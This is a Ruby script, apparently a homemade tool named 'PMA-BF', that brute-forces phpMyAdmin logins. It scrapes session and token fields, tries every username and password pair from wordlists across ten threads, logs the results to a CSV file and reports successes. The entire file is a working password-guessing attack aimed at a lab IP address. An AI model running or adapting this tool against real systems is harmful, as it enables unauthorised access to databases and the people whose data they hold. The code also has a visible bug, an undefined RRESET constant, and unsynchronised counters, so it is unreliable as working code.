require 'net/http'
require 'uri'
require 'thread'
require 'time'

GREEN = "\e[32m"
RED = "\e[31m"
YELLOW = "\e[33m"
CYAN = "\e[36m"
RESET = "\e[0m"


RESUME_FILE = 'resume.txt'
LOG_FILE = 'results.csv'
MAX_THREADS = 10


$active_threads = 0
$success_count = 0
$last_attempts = []
$mutex = Mutex.new
$paused = false


def read_lines(file)
    File.exist?(file) ? File.readlines(file).map(&:chomp).reject(&:empty?) : []
end

def load_progress
    File.exist?(RESUME_FILE) ? File.read(RESUME_FILE).to_i : 0
end

def save_progress(idx)
    File.write(RESUME_FILE, idx.to_s)
end

def extract_value(pattern, html)
    match = html.match(pattern)
    match ? match[1] : ''
end

def add_attempt(attempt)
    $mutex.synchronize do
        $last_attempts << attempt
        $last_attempts.shift if $last_attempts.size > 10
    end
end

def wait_if_paused
    sleep 0.2 while $paused
end

def attempt_login(url, username, password)
    wait_if_paused
    $active_threads += 1

    uri = URI.parse(url)
    res = Net::HTTP.get_response(uri)
    body = res.body

    set_session = extract_value(/name="set_session" value="(.+?)"/, body)
    token = extract_value(/name="token" value="(.+?)"/, body)
    return false if set_session.empty? || token.empty?

    data = URI.encode_www_form({ 'pma_username' => username, 'pma_password' => password, 'set_session' => set_session, 'token' => token })
    res2 = Net::HTTP.post(uri, data, "Content-Type" => "application/x-www-form-urlencoded")
    login_success = res2.body.downcase.include?("logout")

    $mutex.synchronize do
        File.open(LOG_FILE, 'a') { |f| f.puts "#{username},#{password},#{login_success}" }
    end

    color = login_success ? GREEN : RED
    $success_count += 1 if login_success
    add_attempt("#{color}#{username}:#{password}#{RRESET}")

    $active_threads -= 1
    login_success
end


def progress_bar(idx, total)
    bar_width = 40
    percent = idx.to_f / total
    filled = (percent * bar_width).to_i
    empty = bar_width - filled
    bar = "#" * filled + "-" * empty
    "[#{bar}] #{idx}/#{total} #{(percent*100).to_i}% | Active: #{$active_threads} | Success: #{$success_count}"
end

puts " #{CYAN}PMA-BF Tool By null0git#{RESET} "
url = "http://10.0.2.19/phpMyAdmin/index.php"
usernames = read_lines('users.txt')
passwords = read_lines('pass.txt')
total_attempts = usernames.size * passwords.size
start_idx = load_progress
start_time = Time.now

threads = []

usernames.each_with_index do |username, u_idx|
    passwords.each_with_index do |password, p_idx|
        idx = u_idx * passwords.size + p_idx
        next if idx < start_idx

        while $active_threads >= MAX_THREADS
            sleep 0.05
        end

        threads << Thread.new do
            attempt_login(url, username, password)
            save_progress(idx+1)
            elapsed = Time.now - start_time
            print "\r#{progress_bar(idx+1, total_attempts)} | APS: #{((idx+1)/elapsed).round(2)} "
        end
    end
end

threads.each(&:join)
duration = Time.now - start_time
puts "\n\n#{GREEN}[+] Attack Completed!#{RESET}"
puts "Usernames: #{usernames.size}"
puts "Passwords/user: #{passwords.size}"
puts "Total Attempts: #{total_attempts}"
puts "Successes: #{$success_count}"
puts "Duration: #{duration.round(2)} sec"
puts "Attempts/sec: #{(total_attempts/duration).round(2)}"
